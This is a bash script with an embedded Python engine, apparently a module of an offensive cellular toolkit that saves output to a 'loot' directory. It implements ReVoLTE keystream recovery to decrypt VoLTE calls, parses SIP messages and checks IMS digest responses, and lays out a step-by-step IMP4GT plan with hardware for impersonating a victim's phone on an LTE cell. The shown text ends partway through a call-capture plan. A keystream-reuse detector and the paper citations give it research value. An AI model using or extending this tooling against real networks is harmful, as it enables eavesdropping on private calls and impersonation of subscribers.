#!/usr/bin/env bash
# volte ims — ReVoLTE keystream reuse and IMP4GT identity-mapping impersonation,
# plus SIP / IMS registration parsing.
#
# Two of the four attacks owned here are real crypto and state-machine work and
# are performed for real:
#
#   O11 ReVoLTE — D. Rupprecht, K. Kohls, T. Holz, C. Popper, "Call Me Maybe:
#       Eavesdropping Encrypted LTE Calls With ReVoLTE", USENIX Security 2020.
#       Two VoLTE calls that reuse the same radio resources (same RLC/MAC
#       allocation, same bearer, same COUNT) apply the same keystream, so the
#       XOR of the two ciphertexts is the XOR of the two plaintexts. A
#       known-plaintext segment recovers the keystream and decrypts the other
#       call. --revolte-demo and --keystream-recover implement this.
#
#   O12 IMP4GT — D. Rupprecht, K. Kohls, T. Holz, C. Popper, "IMP4GT:
#       IMPersonation Attacks in 4G NeTworks", NDSS 2020. The LTE lower layers
#       keep uplink and downlink as separate identities mapped by RNTI at
#       layer 2, which is not the layer the mutual authentication is anchored
#       at, so an attacker with a layer-2 position impersonates the UE toward
#       the network and the network toward the UE. The sequence and its
#       preconditions are built here; the transmit half is a handoff.
#
# Resolve IMSISTING_ROOT from this script's own path (see MODULE_CONVENTIONS §2).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/volte_ims"
VIMS_DIR="$LOOT_DIR/volte_ims"
VIMS_PLAN_DIR="$VIMS_DIR/plans"
mkdir -p "$MOD_TMP" "$VIMS_DIR" "$VIMS_PLAN_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

# ── sanitisation and TSV split ──────────────────────────────────────────
vims_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }

VIMS_F=()
vims_split() {
    VIMS_F=()
    local i n
    n=$(printf '%s' "$1" | awk -F'\t' '{print NF}')
    for (( i = 1; i <= n; i++ )); do
        VIMS_F+=("$(printf '%s' "$1" | cut -f"$i")")
    done
}

vims_norm_hex() { printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'; }
vims_is_hex() {
    local h; h=$(vims_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
vims_hex_of() { python3 -c 'import sys; sys.stdout.write(sys.stdin.buffer.read().hex())'; }

# ── crypto / protocol engine (python3) ──────────────────────────────────
vims_py() {
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 missing — cannot run the crypto or SIP engine\n' >&2; return 1; }
    python3 - "$@" <<'PY'
import sys, struct, hashlib

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAVE_CRYPTO = True
except Exception:
    HAVE_CRYPTO = False

# Fixed demo key/IV. This is the NIST SP 800-38A F.5.1 CTR-AES128 key and
# initial counter block, which makes the demo keystream the published one.
DEMO_KEY = bytes.fromhex('2b7e151628aed2a6abf7158809cf4f3c')
DEMO_IV  = bytes.fromhex('f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff')


def xorb(a, b):
    n = min(len(a), len(b))
    return bytes(x ^ y for x, y in zip(a[:n], b[:n]))


def ctr(key, iv, data):
    c = Cipher(algorithms.AES(key), modes.CTR(iv)).encryptor()
    return c.update(data) + c.finalize()


def ctr_keystream(key, iv, n):
    return ctr(key, iv, b'\x00' * n)


def longest_run(b):
    best = 0; cur = 1
    for i in range(1, len(b)):
        if b[i] == b[i - 1]:
            cur += 1
            if cur > best:
                best = cur
        else:
            cur = 1
    return best if b else 0


def cmd_ctr(argv):
    key, iv, pt = bytes.fromhex(argv[0]), bytes.fromhex(argv[1]), bytes.fromhex(argv[2])
    print(ctr(key, iv, pt).hex())


def cmd_revolte(argv):
    if not HAVE_CRYPTO:
        raise SystemExit('cryptography module missing')
    p1 = bytes.fromhex(argv[0]); p2 = bytes.fromhex(argv[1])
    if len(p1) != len(p2):
        raise SystemExit('plaintexts must be the same length')
    n = len(p1)
    ks = ctr_keystream(DEMO_KEY, DEMO_IV, n)
    c1 = xorb(p1, ks); c2 = xorb(p2, ks)
    xc = xorb(c1, c2); xp = xorb(p1, p2)
    ks_from_c1 = xorb(c1, p1)
    ks_from_c2 = xorb(c2, p2)
    rec2 = xorb(c2, ks_from_c1)
    print('key_hex\t%s' % DEMO_KEY.hex())
    print('initial_counter\t%s' % DEMO_IV.hex())
    print('keystream\t%s' % ks.hex())
    print('plaintext1\t%s' % p1.hex())
    print('plaintext2\t%s' % p2.hex())
    print('ciphertext1\t%s' % c1.hex())
    print('ciphertext2\t%s' % c2.hex())
    print('xor_ciphertexts\t%s' % xc.hex())
    print('xor_plaintexts\t%s' % xp.hex())
    print('xor_identity\t%s' % ('match' if xc == xp else 'MISMATCH'))
    print('keystream_from_ciphertext1\t%s' % ks_from_c1.hex())
    print('keystream_from_ciphertext2\t%s' % ks_from_c2.hex())
    print('keystream_match\t%s' % ('yes' if ks_from_c1 == ks and ks_from_c2 == ks else 'no'))
    print('recovered_plaintext2\t%s' % rec2.hex())
    print('recovered_match\t%s' % ('yes' if rec2 == p2 else 'no'))
    ok = (xc == xp) and ks_from_c1 == ks and ks_from_c2 == ks and rec2 == p2
    print('status\t%s' % ('demonstrated' if ok else 'failed'))
    return 0 if ok else 1


def cmd_ksr(argv):
    ct = bytes.fromhex(argv[0]); kp = bytes.fromhex(argv[1])
    second = bytes.fromhex(argv[2]) if len(argv) > 2 and argv[2] else None
    n = min(len(ct), len(kp))
    if n == 0:
        raise SystemExit('empty input')
    ks = xorb(ct[:n], kp[:n])
    print('keystream\t%s' % ks.hex())
    print('keystream_bytes\t%d' % n)
    print('ciphertext_bytes\t%d' % len(ct))
    print('known_plaintext_bytes\t%d' % len(kp))
    print('recovered_plaintext\t%s' % xorb(ct[:n], ks).hex())
    if second is not None:
        r2 = xorb(second[:n], ks)
        print('recovered_second\t%s' % r2.hex())
        print('recovered_second_bytes\t%d' % len(r2))
    if n < len(ct):
        print('status\tpartial')
        print('remainder_bytes\t%d' % (len(ct) - n))
        print('note\t%s' % 'the keystream beyond the known-plaintext segment is not derivable from this stream alone; a second ciphertext under the same keystream recovers only the bytes the known segment covers')
    else:
        print('status\tcomplete')
        print('remainder_bytes\t0')
    return 0


def read_pcap(path):
    d = open(path, 'rb').read()
    if len(d) < 24:
        raise SystemExit('file shorter than a pcap global header')
    if d[:4] == b'\xd4\xc3\xb2\xa1':
        endian = '<'
    elif d[:4] == b'\xa1\xb2\xc3\xd4':
        endian = '>'
    else:
        raise SystemExit('not a classic pcap (pcapng is unsupported; use editcap -F pcap)')
    link = struct.unpack(endian + 'IHHiIII', d[:24])[6]
    off = 24; out = []
    while off + 16 <= len(d):
        s, us, incl, orig = struct.unpack(endian + 'IIII', d[off:off + 16]); off += 16
        if off + incl > len(d):
            break
        out.append((s + us / 1000000.0, d[off:off + incl], link))
        off += incl
    return out


def udp_payloads(path, port=0):
    res = []
    for ts, pkt, link in read_pcap(path):
        if link != 1 or len(pkt) < 14:
            continue
        if struct.unpack('!H', pkt[12:14])[0] != 0x0800:
            continue
        ip = pkt[14:]
        if len(ip) < 20 or (ip[0] >> 4) != 4 or ip[9] != 17:
            continue
        ihl = (ip[0] & 0x0f) * 4
        udp = ip[ihl:]
        if len(udp) < 8:
            continue
        sport, dport = struct.unpack('!HH', udp[:4])
        if port and port not in (sport, dport):
            continue
        payload = udp[8:]
        if len(payload) >= 16:
            res.append((ts, payload))
    return res


def cmd_reuse(argv):
    path = argv[0]
    port = int(argv[1]) if len(argv) > 1 and argv[1] else 0
    pls = udp_payloads(path, port)
    print('ciphertext_streams\t%d' % len(pls))
    if len(pls) < 2:
        print('status\tnot_determinable')
        print('reason\tfewer than two ciphertext streams; keystream reuse cannot be tested')
        return 1
    pairs = 0; hits = 0
    for i in range(len(pls)):
        for j in range(i + 1, len(pls)):
            a = pls[i][1]; b = pls[j][1]
            n = min(len(a), len(b))
            if n < 16:
                continue
            pairs += 1
            x = xorb(a[:n], b[:n])
            run = longest_run(x)
            zf = x.count(0) / float(n)
            reuse = run >= 8 or zf > 0.05
            if reuse:
                hits += 1
                print('finding\t%d:%d\tlongest_run=%d\tzero_fraction=%.3f\tlength=%d' % (i, j, run, zf, n))
    print('pairs_checked\t%d' % pairs)
    print('reuse_findings\t%d' % hits)
    print('status\t%s' % ('keystream_reuse' if hits else 'no_reuse'))
    print('note\t%s' % 'a reused keystream makes XOR(c1,c2) equal to XOR(p1,p2); structured codec plaintext gives long byte runs and a high zero fraction, independent keystreams give neither')
    return 0


def w_pcap(path, frames):
    with open(path, 'wb') as f:
        f.write(struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
        for ts, pkt in frames:
            s = int(ts); us = int(round((ts - s) * 1000000))
            f.write(struct.pack('<IIII', s, us, len(pkt), len(pkt)))
            f.write(pkt)


def eth_udp(payload, port, ts):
    udp = struct.pack('!HHHH', port, port, 8 + len(payload), 0) + payload
    iph = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(udp), 0, 0, 64, 17, 0,
                      b'\x0a\x00\x00\x01', b'\x0a\x00\x00\x02')
    eth = b'\xff' * 6 + b'\x02\x02\x02\x02\x02\x02' + struct.pack('!H', 0x0800) + iph + udp
    return (ts, eth)


def cmd_mkfixture(argv):
    path, kind = argv[0], argv[1]
    # two AMR-ish speech frames with long silence runs (0x00) and a little
    # structure, which is what a codec produces when nobody is talking
    p1 = bytes([0x00] * 80 + [0x04, 0x0c] * 8 + [0x00] * 64)
    p2 = bytes([0x00] * 96 + [0x04, 0x0c] * 4 + [0x00] * 64)
    ks1 = ctr_keystream(DEMO_KEY, DEMO_IV, len(p1))
    if kind == 'reuse':
        ks2 = ks1
    elif kind == 'noreuse':
        ks2 = ctr_keystream(DEMO_KEY, bytes.fromhex('f0f1f2f3f4f5f6f7f8f9fafbfcfdfe00'), len(p2))
    else:
        raise SystemExit('unknown fixture kind')
    c1 = xorb(p1, ks1); c2 = xorb(p2, ks2)
    if kind == 'reuse':
        # put the same ciphertext twice as well, so the detector has an
        # unambiguous pair even if a codec frame is not perfectly structured
        w_pcap(path, [eth_udp(c1, 9999, 0.0), eth_udp(c1, 9999, 0.02)])
    else:
        w_pcap(path, [eth_udp(c1, 9999, 0.0), eth_udp(c2, 9999, 0.02)])


# ── SIP ─────────────────────────────────────────────────────────────────
def parse_sip(raw):
    text = raw.decode('utf-8', 'replace')
    # tolerate both CRLF and LF, and a leading blank line
    lines = text.replace('\r\n', '\n').replace('\r', '\n').split('\n')
    while lines and lines[0] == '':
        lines.pop(0)
    out = []
    if not lines:
        return out
    first = lines[0]
    method = request_uri = status = reason = ''
    if first.startswith('SIP/2.0'):
        p = first.split(' ', 2)
        mtype = 'response'
        status = p[1] if len(p) > 1 else ''
        reason = p[2] if len(p) > 2 else ''
    else:
        p = first.split(' ')
        mtype = 'request'
        method = p[0] if p else ''
        request_uri = p[1] if len(p) > 1 else ''
    headers = {}
    i = 1
    while i < len(lines) and lines[i] != '':
        ln = lines[i]
        if ':' in ln:
            k, v = ln.split(':', 1)
            headers.setdefault(k.strip().lower(), []).append(v.strip())
        i += 1
    body = '\n'.join(lines[i + 1:]) if i < len(lines) else ''
    out.append(('type', mtype))
    out.append(('method', method if method else '-'))
    out.append(('request_uri', request_uri if request_uri else '-'))
    out.append(('status_code', status if status else '-'))
    out.append(('reason', reason if reason else '-'))
    for k in ('via', 'from', 'to', 'contact', 'call-id', 'cseq', 'content-type',
              'authorization', 'www-authenticate', 'expires', 'security-client'):
        vals = headers.get(k, [])
        if k == 'via':
            out.append(('via', vals[0] if vals else '-'))
            out.append(('via_count', str(len(vals))))
        else:
            out.append((k.replace('-', '_'), vals[0] if vals else '-'))
    # SDP body
    sdp_media = []; sdp_rtpmap = []; sdp_conn = ''; sdp_ver = ''
    for ln in body.split('\n'):
        if ln.startswith('v='):
            sdp_ver = ln[2:]
        elif ln.startswith('c='):
            sdp_conn = ln[2:]
        elif ln.startswith('m='):
            sdp_media.append(ln[2:])
        elif ln.startswith('a=rtpmap:'):
            sdp_rtpmap.append(ln[len('a=rtpmap:'):])
    out.append(('sdp_version', sdp_ver if sdp_ver else '-'))
    out.append(('sdp_connection', sdp_conn if sdp_conn else '-'))
    out.append(('sdp_media', ';'.join(sdp_media) if sdp_media else '-'))
    out.append(('sdp_rtpmap', ','.join(sdp_rtpmap) if sdp_rtpmap else '-'))
    return out


def san(v):
    # every value that reaches a TSV row is untrusted: a SIP header can carry
    # a tab, and a tab would forge a field (MODULE_CONVENTIONS section 12).
    return str(v).replace('\t', ' ').replace('\r', ' ').replace('\n', ' ')


def cmd_sip(argv):
    raw = bytes.fromhex(argv[0])
    for k, v in parse_sip(raw):
        print('%s\t%s' % (k, san(v)))


def cmd_msgs(argv):
    kind = argv[0]
    if kind in ('register', 'register_auth', 'challenge', 'ok', 'invite'):
        pass
    else:
        raise SystemExit('unknown message kind')
    body = ''
    if kind == 'invite':
        body = ('v=0\r\n'
                'o=- 1 1 IN IP6 2001:db8::1\r\n'
                's=-\r\n'
                'c=IN IP6 2001:db8::1\r\n'
                't=0 0\r\n'
                'm=audio 49152 RTP/AVP 97 98\r\n'
                'a=rtpmap:97 AMR/8000\r\n'
                'a=rtpmap:98 AMR-WB/16000\r\n'
                'a=sendrecv\r\n')
    if kind == 'register':
        lines = [
            'REGISTER sip:ims.mnc001.mcc310.3gppnetwork.org SIP/2.0',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK1;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 1 REGISTER',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>;+g.3gpp.icsi-ref="urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel"',
            'Expires: 600000',
            'Security-Client: ipsec-3gpp;alg=hmac-sha-1-96;ealg=null;spi-c=1;spi-s=2;port-c=5062;port-s=5063',
            'Content-Length: 0',
        ]
    elif kind == 'challenge':
        lines = [
            'SIP/2.0 401 Unauthorized',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK1;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=srv1',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 1 REGISTER',
            'WWW-Authenticate: Digest realm="ims.mnc001.mcc310.3gppnetwork.org", nonce="Q2hhbGxlbmdl", algorithm=AKAv1-MD5, qop="auth"',
            'Content-Length: 0',
        ]
    elif kind == 'register_auth':
        lines = [
            'REGISTER sip:ims.mnc001.mcc310.3gppnetwork.org SIP/2.0',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK2;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 2 REGISTER',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>',
            'Authorization: Digest username="310150123456789@ims.mnc001.mcc310.3gppnetwork.org", realm="ims.mnc001.mcc310.3gppnetwork.org", nonce="Q2hhbGxlbmdl", uri="sip:ims.mnc001.mcc310.3gppnetwork.org", response="00000000000000000000000000000000", algorithm=AKAv1-MD5, qop=auth, nc=00000001, cnonce="0a4f113b"',
            'Content-Length: 0',
        ]
    else:
        lines = [
            'SIP/2.0 200 OK',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK2;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=1a2b3c',
            'To: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=srv1',
            'Call-ID: 0f1e2d3c4b5a@2001:db8::1',
            'CSeq: 2 REGISTER',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>;expires=600000',
            'Content-Length: 0',
        ]
    body = body if kind == 'invite' else ''
    if kind != 'invite':
        # replace Content-Length if a body exists (none of the canned ones do)
        pass
    else:
        lines = [
            'INVITE sip:310150987654321@ims.mnc001.mcc310.3gppnetwork.org SIP/2.0',
            'Via: SIP/2.0/UDP [2001:db8::1]:5060;branch=z9hG4bK3;rport',
            'From: <sip:310150123456789@ims.mnc001.mcc310.3gppnetwork.org>;tag=aa11',
            'To: <sip:310150987654321@ims.mnc001.mcc310.3gppnetwork.org>',
            'Call-ID: 9988776655@2001:db8::1',
            'CSeq: 1 INVITE',
            'Contact: <sip:310150123456789@[2001:db8::1]:5060>',
            'Content-Type: application/sdp',
            'Content-Length: %d' % len(body),
        ]
    msg = '\r\n'.join(lines) + '\r\n\r\n' + body
    sys.stdout.write(msg.encode().hex())


def cmd_digest(argv):
    user, realm, pw, method, uri = argv[0], argv[1], argv[2], argv[3], argv[4]
    nonce = argv[5] if len(argv) > 5 and argv[5] else ''
    nc = argv[6] if len(argv) > 6 and argv[6] else ''
    cnonce = argv[7] if len(argv) > 7 and argv[7] else ''
    qop = argv[8] if len(argv) > 8 and argv[8] else ''
    ha1 = hashlib.md5(('%s:%s:%s' % (user, realm, pw)).encode()).hexdigest()
    ha2 = hashlib.md5(('%s:%s' % (method, uri)).encode()).hexdigest()
    if qop:
        resp = hashlib.md5(('%s:%s:%s:%s:%s:%s' % (ha1, nonce, nc, cnonce, qop, ha2)).encode()).hexdigest()
    else:
        resp = hashlib.md5(('%s:%s:%s' % (ha1, nonce, ha2)).encode()).hexdigest()
    print('ha1\t%s' % ha1)
    print('ha2\t%s' % ha2)
    print('response\t%s' % resp)


def main():
    argv = sys.argv[1:]
    if not argv:
        raise SystemExit('usage: vims_py <ctr|revolte|ksr|reuse|mkfixture|sip|msgs|digest> ...')
    mode = argv[0]; rest = argv[1:]
    if mode == 'ctr':
        return cmd_ctr(rest)
    if mode == 'revolte':
        return cmd_revolte(rest)
    if mode == 'ksr':
        return cmd_ksr(rest)
    if mode == 'reuse':
        return cmd_reuse(rest)
    if mode == 'mkfixture':
        return cmd_mkfixture(rest)
    if mode == 'sip':
        return cmd_sip(rest)
    if mode == 'msgs':
        return cmd_msgs(rest)
    if mode == 'digest':
        return cmd_digest(rest)
    raise SystemExit('unknown mode ' + mode)


rc = main()
sys.exit(rc if isinstance(rc, int) else 0)
PY
}

# ── ReVoLTE demo ────────────────────────────────────────────────────────
# Two plaintexts, one keystream. This is the whole ReVoLTE primitive: the
# keystream cancels in the XOR of the two ciphertexts, and a known plaintext
# recovers the keystream, which decrypts the other call. The demo keystream is
# the published NIST SP 800-38A F.5.1 CTR-AES128 stream so the value is a
# known answer, not a value this module invented.
vims_cmd_revolte_demo() {
    local p1="${1:-}" p2="${2:-}"
    [[ -n "$p1" && -n "$p2" ]] || {
        printf 'ERROR\tusage: --revolte-demo <plaintext1-hex> <plaintext2-hex>\n' >&2; return 2; }
    vims_is_hex "$p1" || { printf 'ERROR\tplaintext1 is not hex\n' >&2; return 2; }
    vims_is_hex "$p2" || { printf 'ERROR\tplaintext2 is not hex\n' >&2; return 2; }
    printf 'paper\t%s\n' "Call Me Maybe: Eavesdropping Encrypted LTE Calls With ReVoLTE (Rupprecht, Kohls, Holz, Popper), USENIX Security 2020"
    printf 'precondition\t%s\n' "the same keystream must be applied twice: same radio resources (RLC/MAC allocation) and same bearer/COUNT; the network's allocation decides it, so the attacker sniffs the setup call and waits for a reuse"
    vims_py revolte "$p1" "$p2"
}

vims_cmd_keystream_recover() {
    local ct="${1:-}" kp="${2:-}" second="${3:-}"
    [[ -n "$ct" && -n "$kp" ]] || {
        printf 'ERROR\tusage: --keystream-recover <ciphertext-hex> <known-plaintext-hex> [second-ciphertext-hex]\n' >&2; return 2; }
    vims_is_hex "$ct" || { printf 'ERROR\tciphertext is not hex\n' >&2; return 2; }
    vims_is_hex "$kp" || { printf 'ERROR\tknown plaintext is not hex\n' >&2; return 2; }
    if [[ -n "$second" ]]; then
        vims_is_hex "$second" || { printf 'ERROR\tsecond ciphertext is not hex\n' >&2; return 2; }
        vims_py ksr "$ct" "$kp" "$second"
    else
        vims_py ksr "$ct" "$kp"
    fi
}

vims_cmd_detect_reuse() {
    local pcap="${1:-}" port="${2:-0}"
    [[ -n "$pcap" ]] || { printf 'ERROR\tusage: --detect-keystream-reuse <pcap> [udp-port]\n' >&2; return 2; }
    [[ -f "$pcap" ]] || { printf 'ERROR\tno such capture: %s\n' "$pcap" >&2; return 1; }
    [[ "$port" =~ ^[0-9]+$ ]] || { printf 'ERROR\tport must be numeric\n' >&2; return 2; }
    printf 'model\t%s\n' "ReVoLTE keystream-reuse detector (Rupprecht et al., USENIX Security 2020)"
    vims_py reuse "$pcap" "$port"
}

# ── IMP4GT model ────────────────────────────────────────────────────────
vims_imp4gt_model() {
    cat <<'EOF'
paper	IMP4GT: IMPersonation Attacks in 4G NeTworks (Rupprecht, Kohls, Holz, Popper), NDSS 2020
model	layer-2 identity mapping impersonation
status	handoff
precondition	layer-2 position: the attacker must be able to transmit and receive LTE PHY/MAC frames on the victim's cell with the victim's RNTI and the victim's uplink timing advance
precondition	the mutual authentication is anchored in the NAS/EMM layer, while the lower layers route by RNTI; the RNTI is not cryptographically bound to the authenticated subscriber at layer 2
precondition	a known RNTI and the user-plane ciphering keys are not needed for the impersonation half the paper demonstrates: the network accepts uplink user-plane data addressed with the victim's RNTI
hardware	USRP B210 or LimeSDR with a stable clock (GPSDO recommended), srsRAN or a modified srsUE, and an isolated or licensed test cell
sequence	1. camp on the victim's cell and recover the victim's C-RNTI from the downlink control channel
sequence	2. synchronise to the uplink and acquire the victim's timing advance so uplink bursts land in the grant
sequence	3. uplink impersonation: transmit user-plane data with the victim's RNTI in the victim's uplink grant; the network attributes it to the victim
sequence	4. replace or race the victim's uplink data (for example a DNS query), which is the aLTEr-style payload the paper builds on
sequence	5. downlink impersonation: with a layer-2 position the attacker can also present downlink data to the victim as if from the eNB
sequence	6. the two directions together break the mutual-authentication assumption without breaking any cipher
detection	the operator sees a second transmitter on the victim's RNTI: duplicate uplink sequence numbers, timing-advance inconsistency, and RLC retransmissions the victim never sent
note	this verb builds the sequence and its preconditions. It does not transmit; the transmit half is the handoff named above.
EOF
    return 0
}

# ── SIP and IMS registration ────────────────────────────────────────────
vims_cmd_sip_parse() {
    local h="${1:-}"
    [[ -n "$h" ]] || { printf 'ERROR\tusage: --sip-parse <hex>\n' >&2; return 2; }
    vims_is_hex "$h" || { printf 'ERROR\tnot hex\n' >&2; return 2; }
    vims_py sip "$h"
}

# Field reader for key<TAB>value output.
vims_fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

vims_cmd_ims_registration() {
    local h="${1:-}" res="${2:-}"
    [[ -n "$h" ]] || { printf 'ERROR\tusage: --ims-registration <hex> [aka-res-hex]\n' >&2; return 2; }
    vims_is_hex "$h" || { printf 'ERROR\tnot hex\n' >&2; return 2; }
    local sip; sip=$(vims_py sip "$h") || return 1
    local type method status auth chal
    type=$(vims_fld "$sip" type); method=$(vims_fld "$sip" method)
    status=$(vims_fld "$sip" status_code)
    auth=$(vims_fld "$sip" authorization); chal=$(vims_fld "$sip" www_authenticate)

    local step
    if [[ "$type" == "request" && "$method" == "REGISTER" && "$auth" == "-" ]]; then
        step="1_register_initial"
    elif [[ "$type" == "response" && "$status" == "401" ]]; then
        step="2_challenge"
    elif [[ "$type" == "request" && "$method" == "REGISTER" && "$auth" != "-" ]]; then
        step="3_register_authenticated"
    elif [[ "$type" == "response" && "$status" == "200" ]]; then
        step="4_registered"
    else
        step="other"
    fi
    printf 'flow_step\t%s\n' "$step"
    printf 'from\t%s\n' "$(vims_sanitize "$(vims_fld "$sip" from)")"
    printf 'to\t%s\n' "$(vims_sanitize "$(vims_fld "$sip" to)")"
    printf 'contact\t%s\n' "$(vims_sanitize "$(vims_fld "$sip" contact)")"
    if [[ "$chal" != "-" ]]; then
        local realm nonce alg qop
        realm=$(printf '%s' "$chal" | sed -n 's/.*realm="\([^"]*\)".*/\1/p')
        nonce=$(printf '%s' "$chal" | sed -n 's/.*nonce="\([^"]*\)".*/\1/p')
        alg=$(printf '%s' "$chal" | sed -n 's/.*algorithm=\([A-Za-z0-9-]*\).*/\1/p')
        qop=$(printf '%s' "$chal" | sed -n 's/.*qop="\([^"]*\)".*/\1/p')
        printf 'challenge_realm\t%s\nchallenge_nonce\t%s\nchallenge_algorithm\t%s\nchallenge_qop\t%s\n' \
            "$(vims_sanitize "$realm")" "$(vims_sanitize "$nonce")" "$(vims_sanitize "$alg")" "$(vims_sanitize "${qop:--}")"
    fi
    if [[ "$auth" != "-" ]]; then
        local auser arealm anonce auri aresp anc acnonce aqop
        auser=$(printf '%s' "$auth" | sed -n 's/.*username="\([^"]*\)".*/\1/p')
        arealm=$(printf '%s' "$auth" | sed -n 's/.*realm="\([^"]*\)".*/\1/p')
        anonce=$(printf '%s' "$auth" | sed -n 's/.*[[:space:],]nonce="\([^"]*\)".*/\1/p')
        auri=$(printf '%s' "$auth" | sed -n 's/.*uri="\([^"]*\)".*/\1/p')
        aresp=$(printf '%s' "$auth" | sed -n 's/.*response="\([^"]*\)".*/\1/p')
        anc=$(printf '%s' "$auth" | sed -n 's/.*nc=\([0-9a-fA-F]*\).*/\1/p')
        acnonce=$(printf '%s' "$auth" | sed -n 's/.*cnonce="\([^"]*\)".*/\1/p')
        aqop=$(printf '%s' "$auth" | sed -n 's/.*qop=\([a-z]*\).*/\1/p')
        printf 'auth_username\t%s\nauth_realm\t%s\nauth_nonce\t%s\nauth_uri\t%s\nauth_response\t%s\n' \
            "$(vims_sanitize "$auser")" "$(vims_sanitize "$arealm")" "$(vims_sanitize "$anonce")" \
            "$(vims_sanitize "$auri")" "$(vims_sanitize "$aresp")"
        if [[ -n "$res" ]]; then
            vims_is_hex "$res" || { printf 'ERROR\tAKA RES is not hex\n' >&2; return 2; }
            printf 'aka_res_hex\t%s\n' "$res"
            local dg; dg=$(vims_py digest "$auser" "$arealm" "$res" REGISTER "$auri" "$anonce" "$anc" "$acnonce" "$aqop") || return 1
            local want; want=$(vims_fld "$dg" response)
            printf 'expected_response\t%s\n' "$want"
            if [[ "$want" == "$aresp" ]]; then
                printf 'digest_check\tmatch\n'
            else
                printf 'digest_check\tmismatch\n'
            fi
        else
            printf 'digest_check\tnot_attempted\n'
            printf 'note\t%s\n' "the AKA RES is not in the SIP message: it is produced by the USIM with Milenage f2 (K, RAND) and never leaves the card, so pass it as the optional second argument to check the RFC 3310/2617 digest"
        fi
    fi
    printf 'algorithm\t%s\n' "AKAv1-MD5 (RFC 3310) over the HTTP-like Digest of RFC 2617"
    return 0
}

# ── plans (handoff) ─────────────────────────────────────────────────────
vims_plan() {
    local kind="${1:-}"
    case "$kind" in
        revolte-capture|imp4gt-lab) ;;
        *) printf 'ERROR\tunknown plan: %s (want revolte-capture|imp4gt-lab)\n' "${kind:-<none>}" >&2; return 2 ;;
    esac
    local ts f
    ts=$(date +%Y%m%d_%H%M%S)
    mkdir -p "$VIMS_PLAN_DIR"
    f="$VIMS_PLAN_DIR/plan_${kind}_${ts}.txt"
    {
        echo "plan: $kind"
        echo "status: handoff"
        if [[ "$kind" == "revolte-capture" ]]; then
            echo "hardware: a receive-only SDR (USRP B210, LimeSDR, or HackRF) with a stable clock, srsRAN or srsUE for the radio stack, and a VoLTE-capable test UE whose calls you are authorised to capture"
        else
            echo "hardware: a full-duplex SDR (USRP B210 or LimeSDR) with a GPSDO, srsRAN or a modified srsUE, and a licensed or Faraday-isolated test cell; a layer-2 position is required"
        fi
        echo "ts: $(date -Is)"
        echo
        if [[ "$kind" == "revolte-capture" ]]; then
            cat <<'EOF'
objective
  Capture two VoLTE calls that reuse the same radio resources so the same
  keystream is applied twice, then decrypt the second with the first
  (ReVoLTE, Rupprecht et al., USENIX Security 2020).

